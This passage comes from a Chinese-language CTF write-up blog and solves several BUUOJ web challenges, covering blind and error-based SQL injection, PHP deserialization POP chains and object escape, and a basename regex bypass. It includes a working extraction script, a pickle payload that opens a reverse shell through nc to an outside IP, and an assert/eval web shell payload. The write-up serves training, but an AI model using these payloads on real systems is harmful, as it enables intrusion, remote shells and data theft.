+<p>采用这个payload即可知道有多少列。<br>刚才说过，数字和字符串比较是恒为真的。假设这个表没有数字列。那列数正确的时候可以正确比较的话肯定会返回1.<br>就算假设这个表有数字列。一般都是递增排列数据的，第一行一般是id，所以1就算对上数字列也应该是相等。<br>最后确定出这里有两列。<br>这里还可以确定出第一列数据的数据类型为整数型，而且为1.<br>通过这两个payload就可以试出来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">((select 0,2)&gt;(select * from f1ag_1s_h3r3_hhhhh)) //1改为0</span><br><span class="line">((select 2,2)&gt;(select * from f1ag_1s_h3r3_hhhhh)) //1改为2</span><br></pre></td></tr></table></figure>
+<p>其中1改为0的时候，报错了，为什么呢，因为0&lt;1，所以返回了false，查不到数据，报错了。<br>而2&gt;0，返回真，可以查到id为1的数据。<br>因为这里只有两列，那flag应该就在第二列了，写个脚本跑出来。</p>
+<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &apos;http://3e1352b3-0bd6-4856-975c-7456ae942600.node3.buuoj.cn/index.php&apos;</span><br><span class="line"></span><br><span class="line">def trans(flag):</span><br><span class="line">    res = &apos;&apos;</span><br><span class="line">    for i in flag:</span><br><span class="line">        res += hex(ord(i))</span><br><span class="line">    res = &apos;0x&apos; + res.replace(&apos;0x&apos;,&apos;&apos;)</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in range(1,500): #这循环一定要大 不然flag长的话跑不完</span><br><span class="line">    low = 32</span><br><span class="line">    high = 127</span><br><span class="line">    mid = (low + high) // 2</span><br><span class="line">    while(low != high):</span><br><span class="line">        hexchar = trans(flag+ chr(mid))</span><br><span class="line">        payload = &apos;((select 1,&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&apos;.format(hexchar)</span><br><span class="line">        data = &#123;</span><br><span class="line">                &apos;id&apos;:payload</span><br><span class="line">                &#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        if &apos;Nu1L&apos; not in res.text:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">    flag += chr(mid-1)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
+<p>这里有一个点。mysql遇到16进制数字的时候会自动转化为ascii字符，所以这里用16进制的方法传数据比较。(因为直接传字符会报错)<br>脚本是用Y1ing大佬的脚本改了一下。</p>
+<h3 id="总结-14"><a href="#总结-14" class="headerlink" title="总结"></a>总结</h3><p>这道题真是又让我学到了新东西，无列名注入之前只会用union select来爆数据，<br>现在学到了一手字符比较。而且还有数字字符比较的小tips啊之类的。<br>对这个数据库更加熟悉了吧。</p>
+<h2 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h2><p>知识点</p>
+<ul>
+<li>pickle反序列化漏洞</li>
+</ul>
+<hr>
+<p>看到题目就应该想到这个知识点了。。<br>cookie里有东西，一看像是base64编码过的。<br>但是解码出来有点奇怪。<br>放到python里。用如下数据解码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import pickle,base64</span><br><span class="line">print(pickle.loads(base64.b64decode(data)))</span><br></pre></td></tr></table></figure>
+<p>会得到一个python对象。<br>之前国赛ikun那题也有类似的利用点。<br>直接写payload弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval, (&quot;__import__(&apos;os&apos;).system(&apos;nc 174.0.200.235 9999 -e /bin/sh&apos;)&quot;,))</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(pickle.dumps(payload())))</span><br></pre></td></tr></table></figure>
+<p>然后申请一个小号开linux机器，连上机器进行操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 9999</span><br></pre></td></tr></table></figure>
+<p>随后把cookie修改一下，就能收到连接了。<br>这里改cooki之后会报错，但是不影响命令执行。<br>这里尝试了另一个payload，但是不知道为什么没能成功连上。失败的payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        import os</span><br><span class="line">        return (os.system, (&quot;nc 174.0.200.235 9999 -e /bin/sh&quot;,))</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(pickle.dumps(payload())))</span><br></pre></td></tr></table></figure>
+<h3 id="总结-15"><a href="#总结-15" class="headerlink" title="总结"></a>总结</h3><p>这道题考点就一个pickle的反序列化漏洞，自己没想到是自己太菜的问题了。<br>而且明明国赛都做过这个考点的题目了。</p>
+<h2 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h2><p>知识点<br>-报错注入</p>
+<hr>
+<p>进去的页面是这样的<br><img src="https://i.loli.net/2020/04/28/Qlnhu1qUAVKBpoE.png" alt="Snipaste_2020-04-28_19-35-34.png"><br>提示过滤了引号和双引号。<br>输入1，2，3之类的没什么特别的地方出现。<br>这里应该排除掉了bool盲注。<br>而且过滤了union，应该也没有办法联合注入了。<br>排除法想到报错注入。<br>使用如下payload即可查出uniqueid。再用uniqueid查flag就行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 验证有无报错注入</span><br><span class="line">extractvalue(1,concat(0x7e,(select database()),0x7e))</span><br><span class="line">//查表名，发现有一个users表</span><br><span class="line">extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))</span><br><span class="line">//列名。有不少列，太长了一次查不完，使用reverse()函数查</span><br><span class="line">// 发现有一个USER列和一个uniqueid列</span><br><span class="line">extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),0x7e))</span><br><span class="line">// 获取uniqueid</span><br><span class="line">extractvalue(1,concat(0x7e,reverse((select group_concat(uniqueid) from users)),0x7e))</span><br></pre></td></tr></table></figure>
+<p>最后把admin的uniqueid放进去查询就能拿到flag了</p>
+<h3 id="总结-16"><a href="#总结-16" class="headerlink" title="总结"></a>总结</h3><p>这道题果然诚不欺我，，比较简单的报错注入，也没有什么别的弯子，算是锻炼自己的手写sql语句能力。</p>
+<h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>知识点</p>
+<ul>
+<li>简单反序列化</li>
+<li>可变函数调用</li>
+</ul>
+<hr>
+<p>这道题有点坑爹。进去看源码发现time.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;</span><br><span class="line">        $this-&gt;b = &quot;date&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a = $this-&gt;a;</span><br><span class="line">        $b = $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new HelloPhp;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;source&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[&quot;data&quot;]);</span><br></pre></td></tr></table></figure>
+<p>这里一看就是反序列化了。php有个可变函数的概念。<br>把这个拉到本地打出payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:2:&quot;-1&quot;;s:1:&quot;b&quot;;s:7:&quot;phpinfo&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>phpinfo是可以接受参数的，-1表示显示全部数据，这个简单一查就知道了。<br>函数过滤了很多，没办法直接执行命令。<br>发现php版本是7.0.33。我当即构造了一个shell连上去了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=O:8:%22HelloPhp%22:2:&#123;s:1:%22a%22;s:20:%22eval($_POST[123456])%22;s:1:%22b%22;s:6:%22assert%22;&#125;</span><br></pre></td></tr></table></figure>
+<p>在这个版本，assert仍然可以当作可变函数来调用。<br>连上去发现没权限，利用绕过disable_func的插件绕过。读到了根目录下的假flag。<br>其实真的flag在phpinfo里。。<br>ctrl+f查一下flag就有了。<br>我还以为本题会有意料不到的绕过disable_func方法的。。</p>
+<h3 id="总结-17"><a href="#总结-17" class="headerlink" title="总结"></a>总结</h3><p>考点比较简单，，但是我还是没找到flag(问了别的师傅才找到)<br>tcl</p>
+<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p>知识点</p>
+<ul>
+<li>代码审计</li>
+</ul>
+<hr>
+<p>进去给了源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&apos;index.php&apos;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &apos;Welcome to &apos;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;pop&apos;]))&#123;</span><br><span class="line">    @unserialize($_GET[&apos;pop&apos;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>找到高危函数include.已知flag在flag.php。这里只要让var为flag.php即可。<br>接下来要想办法调用到invoke这个魔术方法，查看资料可知是把对象当函数用的时候会调用。<br>那这里可以让p为Modifer对象。<br>随后就是想办法调用get这个魔术方法，从而触发invoke获取flag。<br>注意到Show类有一个toString方法，这个会调用$this-&gt;str-&gt;source，可以想到，如果让str为Test对象，访问$this-&gt;str-&gt;source就会调用get魔术方法。<br>这里就要想办法触发toString这个魔术方法，注意到wakeup魔术方法调用了$this-&gt;source，可以让source为Show对象，从而触发toString魔术方法。<br>至此，调用链明了了<br>Show 反序列化时触发 wakeup魔术方法， 而wakeup又触发 toString 调用 $this-&gt;str-&gt;source，令str为Test对象，这里就触发了get魔术方法，而这个魔术方法又触发了invoke这个魔术方法，最后调用include函数获取flag。</p>
+<p>payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var = &apos;php://filter/read=convert.base64-encode/resource=flag.php&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&apos;index.php&apos;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &apos;Welcome to &apos;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = new Modifier();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test = new Show();</span><br><span class="line">$test-&gt;source = new Show();</span><br><span class="line">$test-&gt;source-&gt;str = new Test();</span><br><span class="line">echo serialize($test);</span><br><span class="line">if(isset($_GET[&apos;pop&apos;]))&#123;</span><br><span class="line">    @unserialize($_GET[&apos;pop&apos;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里要注意的两个点，一个是包含时要用php://filter协议，不然会直接执行得不到flag。<br>二是传参的时候，要在protected变量前加上<code>%00</code>这个在给出的链接里有讲。不加无法正确反序列化。</p>
+<h3 id="总结-18"><a href="#总结-18" class="headerlink" title="总结"></a>总结</h3><p>反序列化的题我不大熟悉来着，，这道题给我一个很重要的点，就是this-&gt;something，如果这个是something是对象，<br>是会触发toString魔术方法的。</p>
+<h2 id="安恒4月月赛web1"><a href="#安恒4月月赛web1" class="headerlink" title="安恒4月月赛web1"></a>安恒4月月赛web1</h2><p>知识点</p>
+<ul>
+<li>反序列化对象逃逸</li>
+</ul>
+<hr>
+<p>进去给了源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(&quot;test.php&quot;);</span><br><span class="line">function write($data) &#123;</span><br><span class="line">    return str_replace(chr(0) . &apos;*&apos; . chr(0), &apos;\0\0\0&apos;, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function read($data) &#123;</span><br><span class="line">    return str_replace(&apos;\0\0\0&apos;, chr(0) . &apos;*&apos; . chr(0), $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class A&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    function __construct($a, $b)&#123;</span><br><span class="line">        $this-&gt;username = $a;</span><br><span class="line">        $this-&gt;password = $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    public $b;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        $c = &apos;a&apos;.$this-&gt;b;</span><br><span class="line">        echo $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C&#123;</span><br><span class="line">    public $c;</span><br><span class="line">    function __toString()&#123;</span><br><span class="line">        //flag.php</span><br><span class="line">        echo file_get_contents($this-&gt;c);</span><br><span class="line">        return &apos;nice&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new A($_GET[&apos;a&apos;],$_GET[&apos;b&apos;]);</span><br><span class="line">//省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span><br><span class="line">$b = unserialize(read(write(serialize($a))));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>明显的反序列化问题。先看代码，找到高危函数get_file_contents.这里就要想办法调用这个函数去拿flag。<br>但是这个函数存在于toString里面，要调用这个函数只能从类B下手。让$b为C的实例，这样在’a’.$this-&gt;b的时候就会触发toString函数。<br>最后的问题就是，怎么创造出B的实例，这里只有A可以实例化对象，要从A下手。</p>
+<p>这里明显看到read write两个函数，有对数据的过滤操作，这就符合反序列化对象逃逸的条件了。<br>但是write和read是相反的过程，如果先利用write再利用read是没用的，所以这里要想办法只利用read函数。</p>
+<p>可以看到read函数的作用是这样的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;\0\0\0&apos;替换为chr(0).&apos;*&apos;.chr(0)</span><br><span class="line">这里要注意，\0是两个字符，而替换后变成了三个字符。</span><br></pre></td></tr></table></figure>
+<p>那利用的办法就出来了，给a这个参数传<code>\0</code>，替换后字符对不上，会往后吞字符，从而让值逃逸出来。<br>payload可以这样慢慢算出来，而且不唯一，下面给出payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b=a&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>这个payload在经过read的作用后变成这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:48:&quot;********&quot;;s:8:&quot;password&quot;;s:74:&quot;a&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>注意*号两边都有空字节没法打印出来，一个*号其实可以看成3字节<br>最后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:74:&quot;a&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>逃逸出来，形成新的键和值，成功反序列化后，后边的多余信息不会影响。</p>
+<h3 id="总结-19"><a href="#总结-19" class="headerlink" title="总结"></a>总结</h3><p>这道题其实一开始没做出来，后边知道$this-&gt;something可以触发toString之后才想到的。</p>
+<h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p>就是写个脚本跑。。。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">res = session.post(&apos;http://a7631c41-8fdf-4300-b79c-3a7ecdf99fc4.node3.buuoj.cn&apos;)</span><br><span class="line">test = re.search(r&apos;(\d+)\s([-+])\s(\d+)&apos;,res.text)</span><br><span class="line">print(test.group(1),test.group(2),test.group(3))</span><br><span class="line">result = eval(test.group(1) + test.group(2) + test.group(3))</span><br><span class="line">for i in range(1001):</span><br><span class="line">    data = &#123;&apos;answer&apos;: result&#125;</span><br><span class="line">    res = session.post(&apos;http://a7631c41-8fdf-4300-b79c-3a7ecdf99fc4.node3.buuoj.cn/index.php&apos;, data=data)</span><br><span class="line">    test = re.search(r&apos;(\d+)\s([-+])\s(\d+)&apos;,res.text)</span><br><span class="line">    print(&apos;匹配部分&apos;,test.group(1),test.group(2),test.group(3))</span><br><span class="line">    print(&apos;data:&apos;,data)</span><br><span class="line">    result = eval(test.group(1) + test.group(2) + test.group(3))</span><br><span class="line">    print(res.text.encode(&apos;utf-8&apos;))</span><br><span class="line">    # input()</span><br></pre></td></tr></table></figure>
+<p>注意一下，区分身份用的cookie，所以要创建一个实例保存数据，不然直接提交不成功。</p>
+<h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p>知识点</p>
+<ul>
+<li>basename处理多字节数据时出现的问题</li>
+</ul>
+<hr>
+<p>进去给了源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;config.php&apos;; // FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&apos;/config\.php\/*$/i&apos;, $_SERVER[&apos;PHP_SELF&apos;])) &#123;</span><br><span class="line">  exit(&quot;I don&apos;t know what you are thinking, but I won&apos;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;source&apos;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&apos;PHP_SELF&apos;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(64));</span><br><span class="line">if (isset($_POST[&apos;guess&apos;])) &#123;</span><br><span class="line">  $guess = (string) $_POST[&apos;guess&apos;];</span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = &apos;Congratulations! The flag is: &apos; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message = &apos;Wrong.&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>明显看到想得到flag有两个方法，一是绕过正则过滤，这里不能以/config.php(/)结尾。<br>第二个方法是猜字符串，这里字符串64位还转成了16进制，基本不可能。<br>但是还是去搜集了资料，hash_equals比===更安全，因为hash_equals可以防止根据比较用时猜字符串长度。</p>
+<hr>
+<p>又搜索了bin2hex和random_bytes是否存在可攻击的漏洞，没发现。<br>那就只剩下过正则来解题了。<br>非常可惜我没能get到basename的点。最后还是搜索wp才做出来的。<br><a href="https://z3ratu1.github.io/2020/03/23/%5BZer0pts2020%5DCan%20you%20guess%20it/" target="_blank" rel="noopener">传送门</a><br>关于basename函数，官网有这样一个描述。</p>
+<blockquote>
+<p>basename() is locale aware, so for it to see the correct basename with multibyte character paths, the matching locale must be set using the setlocale() function.<br>这里题型我们处理多字节字符的时候要用setlocale函数保证不出错。只要超过ascii范围就是多字节了，这里可以这样来绕正则</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php/config.php/测试?source</span><br></pre></td></tr></table></figure>
